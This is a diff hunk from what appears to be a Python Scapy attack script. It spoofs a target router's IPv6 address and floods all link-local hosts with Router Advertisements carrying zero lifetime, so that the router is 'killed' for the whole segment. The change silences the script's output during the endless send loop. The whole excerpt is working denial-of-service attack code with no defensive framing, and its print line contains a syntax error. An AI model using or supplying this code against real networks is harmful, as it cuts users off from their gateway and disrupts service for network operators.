@@ -13,5 +13,5 @@ else:
 print("Killing the router with address " + target_ip.)
 layer3 = IPv6(src=target_ip, dst="ff02::1")
 packet = layer3/ICMPv6ND_RA(prf="High", routerlifetime=0)
-send(packet, loop=1)
+send(packet, loop=1, verbose=False)
 
